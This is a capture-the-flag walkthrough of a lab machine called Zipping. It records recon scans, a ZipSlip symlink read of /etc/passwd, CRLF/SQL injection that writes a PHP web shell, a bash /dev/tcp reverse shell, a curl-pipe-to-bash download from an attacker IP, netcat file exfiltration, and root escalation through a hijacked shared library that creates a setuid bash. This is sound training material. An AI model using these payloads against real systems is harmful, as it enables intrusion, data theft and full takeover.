# RECON:
## **FIRST SCAN**
```
sudo nmap -p- --open -sS -Pn -n --min-rate 5000 10.10.11.229 -oN allports
[sudo] password for cds:
Starting Nmap 7.94 ( [https://nmap.org](https://nmap.org) ) at 2023-10-15 20:29 EDT
Nmap scan report for 10.10.11.229
Host is up (0.26s latency).
Not shown: 55074 closed tcp ports (reset), 10459 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
```
## **SECOND SCAN**
```
sudo nmap -sVC -p 22,80 10.10.11.229 -oN targeted
Starting Nmap 7.94 ( [https://nmap.org](https://nmap.org) ) at 2023-10-15 20:31 EDT
Nmap scan report for 10.10.11.229
Host is up (0.42s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_ 256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open http Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# **Launchpad**
```
openssh-server 1:9.0p1-1ubuntu7.3
(riscv64 binary)
ubuntu kinetic
Apache httpd 2.4.54 (seems kinetic)
Ubuntu 22.10(seems to be this version of ubuntu)
kinetic
```
## **WHATWEB**
```
whatweb [http://10.10.11.229/](http://10.10.11.229/)
[http://10.10.11.229/](http://10.10.11.229/) [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], Email[info@website.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.54 (Ubuntu)], IP[10.10.11.229], JQuery[3.4.1], Meta-Author[Devcrud], PoweredBy[precision], Script, Title[Zipping | Watch store]
```
## WAPPALIZER
```
SERVERS:
APACHE HTTP SERVER 2.4.5.4

PROGRAMMING LANGUAGES:
PHP

OPERATING SYSTEMS:
UBUNTU

JAVASCRIPT LIBRARIES:
JQUERY


UI FRAMEWORKS:
BOOTSTRAP 4.3.1
```

### Some facts:
This is a Ubuntu machine , with an apache server 2.4.5.4 and works with php language.


# FOOTHOLD

##### Rabbit hole:

I fall in a rabbit hole at the start, this machine has a functionality of upload files, It only accepts pdf formats inside of a zip. I bypased it naming the file like this: 

file.phpA.pdf, then I was intercepting the upload petition with burpsuit and finally editting (hex functionality) the "A" by a nullbyte. This reverse shell was a rabbit hole, even if I had the path to the file the server given me a 404 not found.


##### The solution:
This machine has a  ZipSlip vunlerability.  https://security.snyk.io/research/zip-slip-vulnerability

To get the user flag I stared doing a POC 

I used a binary called `ln` that makes links between files

This was the command:
` ln -s ../../../../../../etc/passwd document.pdf `

The option (-s , --symbolic make symbolic links instead of hard links)

The second step was put the file inside of a zip

```
zip --symlinks zip.zip document.pdf
```

Symlinks: 
```
-y
    --symlinks

For UNIX and VMS (V8.3 and later), store symbolic links as such
in the zip archive, instead of compressing and storing the file
referred to by the link. This can avoid multiple copies of files
being included in the archive as zip recurses the directory trees
and accesses files directly and by links.
```


The third step is upload the file, and then go to the link that the website gives you. Push F12 and then go to NETWORK   click on the response 304 and then click the option RESPONSE. This response ins on base64 I use on my terminal

```
echo "<base64encodedmessage>" | base64 -d ; echo
```

And I watched the /etc/passwd message. Here I found a user called "rektsu" So, I did the same process to see the user flag. Instead of put the /etc/passwd path I did this:

1- Use ln -s
```
ln -s /home/rektsu/user.txt user.pdf
```
2- Put the file on a zip
```
zip --symlinks zip1.zip user.pdf
```
3- Upload the file, decode the response and read the flag.


The next step, to get acces to the machine is exploit a vulnerable input on the cart functionality, the "id" is vulnerable to a CRLF injection combined with a mysql query
[https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

```
POST /shop/index.php?page=cart HTTP/1.1

Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: [http://10.10.11.229](http://10.10.11.229)
Connection: close
Referer: [http://10.10.11.229/shop/index.php?page=product&id=1](http://10.10.11.229/shop/index.php?page=product&id=1)
Cookie: PHPSESSID=4c5ka2ksmc77g5j5o8tmmf0e1p
Upgrade-Insecure-Requests: 1

quantity=1&product_id=
```


The way to exploit this is using a POC watching if we have permissions to write, If we have success on the path that we chose, the next step is trigger the shell on file that we uploaded.
If we get a 302 response it means that we have success otherwise we will be redirected to the cart site.

SUCESSFULL TEST INPUT

```

POST /shop/index.php?page=cart HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: [http://10.10.11.229](http://10.10.11.229)
Connection: close
Referer: [http://10.10.11.229/shop/index.php?page=product&id=1](http://10.10.11.229/shop/index.php?page=product&id=1)
Cookie: PHPSESSID=4c5ka2ksmc77g5j5o8tmmf0e1p
Upgrade-Insecure-Requests: 1

quantity=1&product_id=%0a'%3bselect+version@@++into+outfile+'/var/lib/mysql/version.php'%3b --1

```

SUCESSFULL TEST OUTPUT

```

HTTP/1.1 302 Found
Date: Mon, 06 Nov 2023 18:17:41 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: index.php?page=cart
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```


Now the way to trigger the reverse shell and put it on the machine was like this:

- Create the reverse shell:
```
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.86/9001 0>&1'" > rev.sh
```

- Listen with python server 
```
sudo python3 -m http.server 80
```

- Listen on your machine with netcat 
```
nc -lvnp 9001
```

- Upload a file to the machine 
```
curl -s $'http://zipping.htb/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.16.86/rev.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/reverse.php\'+%231'
```

We create a file with the content `<?php system("curl http://10.10.10.10/rev.sh|bash");?>` and  we save it on the folder `/var/lib/mysql/ `  with the name  `reverse.php`  

- Trigger the reverse shell
```
curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2freverse'
```

This last step is when we trigger the reverse shell we make a petition to the /var/lib/mysql/reverse.


# Root:

Using sudo -l i was able to use a binary called "stock" without as root.

`/usr/bin/stock`

The command file gived me this:

```
/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped
```

When I executed it , the binary asked me for a password that I don't have. I translated it to my kali machine so I was able to inspec it with ghidra. (I used strings and I wasn't able to guess that the password was St0ckM4nager ).

I used python first 

```
python3 -m http.server
```
I translated netcat to the victim machine , on the victim machine , folder tmp I typed.
```
wget 10.10.10.10:8000/nc

chmod u+x nc
```

In my machine I used this command to recive the file:
```
nc -l -p 1234 > stock
```
On the victim to send the file
```
./nc -w 3 10.10.16.86 1234 < /usr/bin/stock
```


The next step once I have the password, was see more in detail what the binary does when I execute it.

I executed:
```
strace stock
```

I found that in some point the binary called this file `/home/rektsu/.config/libcounter.so` . The same do not exists. I get to the folder `/home/rektsu/.config/` and I did not see it. So I created my own one on the same path.

First I created this file on the folder tmp and I called it libcounter.c  
`/tmp/libcounter.c`

```
# include <stdio.h>
# include <stdlib.h>

static void inject()__attribute__((constructor));

void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

And then I compiled it with gcc
`gcc -shared -o /home/rekstu/.config/libcounter.so -fPIC /tmp/libcounter.c`


The next step was executing it `sudo /usr/bin/stock`

Finally use "whoami" and I can see that I was root , and I was ready to cat the root flag




# Assets 

C FILE:

Libraries: The script imports two libraries at the beginning.
• stdio.h: This is the standard input and output library in C. It contains functions for data input and output.
• stdlib.h: This is the general-purpose standard library in C. It contains prototype functions for dynamic memory management, process control, and others.


Static void inject() function: Yes, inject is a function. The static keyword means that the function is visible only within the current source file. Void indicates that the function does not return any value.

__attribute__((constructor)) attribute: This is a GCC-specific attribute that, when used with a function, executes that function at the beginning of the program, that is, before the main()5 function.



GCC:

-shared: This option tells the compiler to generate a shared library file (a .so file on Linux). Shared libraries are files that contain code that can be used by multiple programs at the same time.

-fPIC: PIC stands for “Position Independent Code”. This option tells the compiler to generate code that does not depend on a specific location in memory. This is important for shared libraries, since they can be loaded into different memory locations in different programs.